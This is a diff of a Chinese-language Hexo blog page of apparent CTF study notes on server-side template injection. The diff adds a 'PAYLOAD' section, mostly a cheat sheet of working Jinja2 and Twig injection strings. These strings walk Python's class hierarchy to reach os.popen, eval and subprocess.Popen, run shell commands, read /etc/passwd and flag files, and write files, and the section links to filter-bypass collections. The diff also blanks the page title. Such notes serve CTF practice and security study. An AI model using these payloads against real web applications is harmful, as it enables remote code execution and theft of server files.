@@ -5,7 +5,7 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SSTI - Hexo</title>
+    <title> - Hexo</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
@@ -30,7 +30,7 @@
     <div class="bar" style="width: 0;"></div>
     <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
     <div title="播放/暂停" class="iconfont icon-play"></div>
-    <h3 class="subtitle">SSTI</h3>
+    <h3 class="subtitle"></h3>
     <div class="social">
         <div>
             <div class="share">
@@ -45,7 +45,7 @@
     <div class="section">
         <div class="article">
     <div class='main'>
-        <h1 class="title">SSTI</h1>
+        <h1 class="title"></h1>
         <div class="stuff">
             <span>十二月 14, 2021</span>
             
@@ -86,6 +86,70 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;cat /app/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>有些不理解，先当作常用命令记着吧！！</p>
+<h1 id="PAYLOAD"><a href="#PAYLOAD" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h1><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=1231&#123;&#123;2*4&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>判断是不是ssti</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&#123;&#123;system(&#x27;ls&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行命令，但不能成功，，好像是空格不可以</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这是最后的payload</p>
+<p><a target="_blank" rel="noopener" href="https://0day.work/jinja2-template-injection-filter-bypasses/">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p>
+<p>bypass</p>
+<p>攻防世界的题Web_python_template_injection</p>
+<p>jinjia的语言：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">控制结构 &#123;% %&#125;</span><br><span class="line">变量取值 &#123;&#123; &#125;&#125;</span><br><span class="line">注释 &#123;# #&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p> ：查看所有的模块</p>
+<p>os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个</p>
+<p>利用到的是<strong>func_globals.keys()</strong> ：查看全局函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27; )</span><br></pre></td></tr></table></figure>
+
+<p>查看flag文件所在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;fl4g&quot;).read()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>读取文件 利用到的是object对象下的file类的read函数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/[python](https://so.csdn.net/so/search?q=python&amp;spm=1001.2101.3001.7020)/">https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/[python](https://so.csdn.net/so/search?q=python&amp;spm=1001.2101.3001.7020)/</a></p>
+<p>基础类的执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象（类）</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>常见的基础调用类函数执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()</span><br><span class="line"># 返回子类的列表 [,,,...]</span><br><span class="line">#从中随便选一个类,查看它的__init__</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()[30].__init__</span><br><span class="line">&lt;slot wrapper &#x27;__init__&#x27; of &#x27;object&#x27; objects&gt;</span><br><span class="line"># wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span><br><span class="line">#再换几个子类，很快就能找到一个重载过__init__的类，比如</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]</span><br><span class="line">#然后用eval执行命令即可</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-获取基类"><a href="#1-获取基类" class="headerlink" title="1.获取基类"></a>1.获取基类</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//获取基本类</span><br><span class="line">```bash</span><br><span class="line">&#x27;&#123;&#123;[].__class__&#125;&#125;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>获取所有类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>获取config对象与request对象类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#123;&#123;url_for.__globals__&#125;&#125;&#x27;</span><br><span class="line">&#x27;&#123;&#123;config&#125;&#125;#即查看权限&#x27;</span><br><span class="line">&#x27;&#123;&#123; config.SQLALCHEMY_DATABASE_URI &#125;&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>python</p>
+<p>读取文件类，&lt;type ‘file’&gt; file位置一般为40，直接调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>&lt;class ‘site._Printer’&gt; 调用os的popen执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如果system被过滤，用os的listdir读取目录+file模块读取文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>&lt;class ‘subprocess.Popen’&gt; 位置一般为258</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;&#x27;</span><br><span class="line">&#x27;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;ls /flasklight&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;&#x27;</span><br><span class="line">&#x27;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>&lt;class ‘warnings.catch_warnings’&gt;<br>一般位置为59，可以用它来调用file、os、eval、commands等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#调用file</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()      #把 read() 改为 write() 就是写文件</span><br><span class="line">#读文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&#x27;C:\1.php&#x27;).read()</span><br><span class="line">object.__subclasses__()[40](r&#x27;C:\1.php&#x27;).read()</span><br><span class="line">#写文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line">object.__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line"></span><br><span class="line">#调用eval</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)</span><br><span class="line">#调用system方法</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.values()[144](&#x27;whoami&#x27;)</span><br><span class="line">root</span><br><span class="line">0</span><br><span class="line">#调用commands进行命令执行</span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>python3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#读取文件与写文件类</span><br><span class="line">&#x27;&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()&#125;&#125;&#x27;</span><br><span class="line">#执行命令</span><br><span class="line">&#x27;&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)&#125;&#125;&#x27;</span><br><span class="line">#命令执行：</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#文件操作</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="payload大全"><a href="#payload大全" class="headerlink" title="payload大全"></a>payload大全</h2><p>及绕过payload大全_HoAd’blog-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54515836/article/details/113778233">https://blog.csdn.net/weixin_54515836/article/details/113778233</a>)</p>
+<p><img src="sql.assets/1596031074.jpg!small" alt="img"></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
@@ -121,7 +185,7 @@
     </div>
     
         <div class='side'>
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">SSTI 模板注入漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Simple-SSTI-2-bugku"><span class="toc-number">2.</span> <span class="toc-text">Simple_SSTI_2  bugku</span></a></li></ol>	
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">SSTI 模板注入漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Simple-SSTI-2-bugku"><span class="toc-number">2.</span> <span class="toc-text">Simple_SSTI_2  bugku</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PAYLOAD"><span class="toc-number">3.</span> <span class="toc-text">PAYLOAD</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Cookie-is-so-stable"><span class="toc-number">3.1.</span> <span class="toc-text">[BJDCTF2020]Cookie is so stable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96%E5%9F%BA%E7%B1%BB"><span class="toc-number">3.2.</span> <span class="toc-text">1.获取基类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload%E5%A4%A7%E5%85%A8"><span class="toc-number">3.3.</span> <span class="toc-text">payload大全</span></a></li></ol></li></ol>	
         </div>
     
 </div>
